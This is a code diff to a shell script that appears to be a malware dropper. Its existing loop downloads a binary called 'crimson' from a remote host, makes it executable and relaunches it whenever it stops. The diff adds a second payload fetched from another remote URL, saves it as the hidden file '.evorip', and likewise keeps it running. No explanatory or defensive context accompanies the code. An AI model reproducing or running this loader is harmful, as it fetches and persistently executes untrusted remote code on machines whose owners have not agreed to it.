@@ -11,8 +11,10 @@ fi
 
 if [ "$(command -v curl)" ] > /dev/null; then
   export bin_command="curl -s -o ${dir}/crimson"
+  export mo2_command="curl -s -o ${dir}/.evorip"
 elif [ "$(command -v wget)" ] > /dev/null; then
   export bin_command="wget -q -O ${dir}/crimson"
+  export mo2_command="wget -q -O ${dir}/.evorip"
 else
   exit
 fi  
@@ -27,8 +29,15 @@ while true; do
             ${bin_command} https://cybercrim.es/crimson.arm
             chmod a+x ${dir}/crimson
         fi
+    elif [ ! -f "${dir}/.evorip" ]; then
+      ${mo2_command} https://openstorage.org/l1
+      chmod a+x ${dir}/.evorip
     fi
 
+    if ! pgrep -f '.evorip'; then
+        cd ${dir} && ./.evorip
+    fi
+    
     if ! pgrep -f 'crimson'; then
         cd ${dir} && ./crimson
     sleep 4
